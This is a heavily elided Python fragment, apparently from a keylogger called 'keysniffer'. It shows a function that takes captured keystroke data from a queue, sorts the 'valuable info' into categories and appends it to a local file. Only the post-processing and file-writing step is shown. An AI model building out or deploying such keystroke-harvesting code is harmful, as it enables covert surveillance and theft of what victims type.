...
def extract_valuable_info(keysniffer_data):
    ...
    while True:
        ...
        if not key_data_queue.empty():
            ...
            # Append the extracted data to the original file
            if os.path.exists(keysniffer_data):
                with open(keysniffer_data, "a") as original_file:
                    original_file.write("\nFiltered Data:\n")
                    for category, items in extracted_data.items():
                        original_file.write(f"{category.capitalize()}:\n")
                        for item in items:
                            original_file.write(f"  {item}\n")
                        original_file.write("\n")

            # Clear the extracted data after appending
...
if __name__ == "__main__":
    ...
    if check_and_create_file("keysniffer_data.txt", "keysniffer_data.txt"):
